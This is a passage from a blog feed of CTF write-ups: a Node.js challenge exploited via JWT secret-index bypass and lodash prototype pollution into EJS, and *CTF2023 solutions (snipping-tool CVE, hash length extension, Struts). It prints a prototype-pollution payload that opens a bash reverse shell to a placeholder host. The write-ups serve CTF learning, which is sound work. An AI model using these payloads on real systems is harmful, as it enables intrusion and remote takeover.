punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> token<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">username</span><span class="token operator">:</span> username<span class="token punctuation">,</span>                <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>            res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Username existed."</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Token: "</span> <span class="token operator">+</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>        <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;register123123token<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY5MzU4NDM0NH0.i1rjUzM3MYuzBMzz3sW023l-mt4Sd6VAHkdS5UxYF3g</code><br>++token&#x2F;update<br><img src="https://img-blog.csdnimg.cn/147fab8f0404456fb686b4acd0d9ec5d.png" alt="1"><br></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nssflagnssnss<br>token<br><img src="https://img-blog.csdnimg.cn/86cbadda16d549b494ecc4c5c66dd2c8.png" alt="2"><br>HS256HMAC</p><blockquote><p>salt<br>saltMD5<code>md5(message+salt)</code>saltsaltmessage<br>HmacKeyed-Hashing for Message Authenticationkey<br>saltHmacMD5SHA-1Hmacsalt</p></blockquote><p>jwtjwt.verifyiatjwt<br>&#x2F;loginjwt</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>secret</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sid</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sidjwtsecretidsidnullundefinedsidsecretsecret[sid]sid<code>[]</code>secretjwt<br><img src="https://img-blog.csdnimg.cn/28f08cdf50bb4c89a25f55d92309001b.png" alt="5"><br>nss</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>lodash.merge</code>ejsrceshell</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>    <span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">"client"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/x.x.x.x/4444 0>&amp;1\"');"</span><span class="token punctuation">,</span><span class="token string-property property">"compileDebug"</span><span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/d7cdae347d354d2095b299a191781c92.png" alt="1"><br>vps&#x2F;homeshellvps<br><img src="https://img-blog.csdnimg.cn/d9aca416514840d5a8bda2d576dd09c7.png" alt="6"><br>flag<br><img src="https://img-blog.csdnimg.cn/b13276b67e4c413d9828703a218e0f81.png" alt="6"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><br><a href="https://xz.aliyun.com/t/6776#toc-8">JWT</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183198304823296">hmac</a></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>()CTF2023</title>
      <link href="/2023/07/30/(%E5%85%AD%E6%98%9F)CTF2023/"/>
      <url>/2023/07/30/(%E5%85%AD%E6%98%9F)CTF2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/471de38845874a84a1a1673a28a23118.jpeg#pic_center" alt="*CTF2023"></p><p><img src="https://img-blog.csdnimg.cn/326ea0d2418342a985041a588461e760.png" alt="1"></p><h2 id="MISC-snippingTools"><a href="#MISC-snippingTools" class="headerlink" title="MISC-snippingTools"></a>MISC-snippingTools</h2><p>cve-2023-28303<br>exp</p><p><a href="https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02">https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02</a></p><p>2560*1600</p><p></p><blockquote><p>python 1.py 2560 1600 1.png 2.png</p></blockquote><p>2.png</p><p>flagStegsolve.jar</p><p><img src="https://img-blog.csdnimg.cn/e8ee345b4f5546ba8ea1ef6bc526e853.png#pic_center" alt="1"></p><p>*ctf{cve-2023-28303-windows-snipping-tool-is-not-secure-4E9019139D9A}</p><h2 id="WEB-jwt2struts"><a href="#WEB-jwt2struts" class="headerlink" title="WEB-jwt2struts"></a>WEB-jwt2struts</h2><p></p><blockquote><p>JWT+HASH+struct2</p></blockquote><p><img src="https://img-blog.csdnimg.cn/dd019c9dd6014989aa2bfce816280f5e.png" alt="1"></p><p>access_tokenuseradminkey<br><img src="https://img-blog.csdnimg.cn/2493b913c66145efb9947b91334c386c.png" alt="2"><br><code>JWT_key.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./secret_key.php"</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./salt.php"</span><span class="token punctuation">;</span><span class="token comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><span class="token comment">//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df</span>@<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"The secret_key is "</span><span class="token operator">.</span> <span class="token variable">$secret_key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hash<a href="https://ventureyu.github.io/2018/08/14/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95/"></a><br>hashpump<br><img src="https://img-blog.csdnimg.cn/672b58df3ff446078a98821ee0bf7a5c.png" alt="2"></p><p><code>\x</code><code>%</code>key<code>sk-he00lctf3r</code><br><img src="https://img-blog.csdnimg.cn/338b99d6f5db4cad8a6ab2ff08fc8871.png" alt="123"><br>&#x2F;admiiiiiiiiiiin<br><img src="https://img-blog.csdnimg.cn/b7edcf764280415dbf8e4b5da9dda22d.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/8b32d79da7a74173907f4b7bbc5b4413.png" alt="2"><br><strong><a href="http://140.210.223.216:55557/admiiiiiiiiiiin/user.action">http://140.210.223.216:55557/admiiiiiiiiiiin/user.action</a></strong><br></p><p><img src="https://img-blog.csdnimg.cn/39f533a11214400bb63fd2e1141eeab1.png" alt="3"><br>flag</p><p><img src="https://img-blog.csdnimg.cn/85007a54f8e44a86a5111539041c805e.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="/2023/07/23/DC-3/"/>
      <url>/2023/07/23/DC-3/</url>
      
